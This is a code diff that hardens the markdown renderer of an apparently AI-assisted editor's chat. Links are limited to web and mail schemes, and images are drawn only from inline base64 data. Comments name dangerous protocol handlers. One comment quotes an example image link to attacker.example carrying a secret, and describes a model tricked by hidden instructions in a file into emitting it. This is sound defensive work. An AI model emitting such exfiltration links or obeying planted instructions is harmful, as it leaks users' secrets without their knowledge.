@@ -16,6 +16,19 @@ import { BlockCode } from '../util/inputs.js'
 import { CodespanLocationLink } from '../../../../common/chatThreadServiceTypes.js'
 import { getBasename, getRelative, vaderOpenFileFn } from '../sidebar-tsx/SidebarChat.js'
 
+// Links and images in chat markdown (model output, tool results, marketplace text) are untrusted: see the uses below.
+const SAFE_LINK_SCHEMES = new Set(['http:', 'https:', 'mailto:'])
+export const isSafeLinkHref = (href: string | undefined | null): boolean => {
+	if (!href) return false
+	const trimmed = href.trim()
+	if (trimmed.startsWith('#')) return false // in-page anchors do nothing here
+	try { return SAFE_LINK_SCHEMES.has(new URL(trimmed).protocol) } catch { return false }
+}
+export const isInlineImageHref = (href: string | undefined | null): boolean =>
+	!!href && /^data:image\/(png|jpe?g|gif|webp);base64,[A-Za-z0-9+/=]+$/i.test(href.trim())
+
+
+
 
 export type ChatMessageLocation = {
 	threadId: string;
@@ -482,9 +495,14 @@ const RenderToken = ({ token, inPTag, codeURI, chatMessageLocation, tokenIdx, ..
 	}
 
 	if (t.type === 'link') {
+		// Text from a model or from a file it read can carry any link. Only web and mail links are followed: the operating system would open
+		// `file:`, `smb:` (leaks the Windows login hash), `ms-msdt:`, `search-ms:` or any other registered protocol handler with one click.
+		if (!isSafeLinkHref(t.href)) {
+			return <span title={t.href} className='text-vader-fg-2'>{t.text}</span>
+		}
 		return (
 			<a
-				onClick={() => { window.open(t.href) }}
+				onClick={(e) => { e.preventDefault(); window.open(t.href) }}
 				href={t.href}
 				title={t.title ?? undefined}
 				className='underline cursor-pointer hover:brightness-90 transition-all duration-200 text-vader-fg-2'
@@ -495,12 +513,15 @@ const RenderToken = ({ token, inPTag, codeURI, chatMessageLocation, tokenIdx, ..
 	}
 
 	if (t.type === 'image') {
-		return <img
-			src={t.href}
-			alt={t.text}
-			title={t.title ?? undefined}
-
-		/>
+		// An <img> to a web address is fetched the moment it is shown, with whatever the address contains: `![](https://attacker.example/?d=<secret>)`
+		// in a model answer (for instance after it read a file with hidden instructions) would send the secret out with no click. Only images that
+		// carry their own bytes are drawn; a web image is shown as a link the user can choose to open.
+		if (isInlineImageHref(t.href)) {
+			return <img src={t.href} alt={t.text} title={t.title ?? undefined} />
+		}
+		return isSafeLinkHref(t.href)
+			? <a onClick={(e) => { e.preventDefault(); window.open(t.href) }} href={t.href} title={`Image not loaded automatically: ${t.href}`} className='underline cursor-pointer text-vader-fg-2'>[image: {t.text || t.href}]</a>
+			: <span className='text-vader-fg-2'>[image: {t.text}]</span>
 	}
 
 	if (t.type === 'strong') {
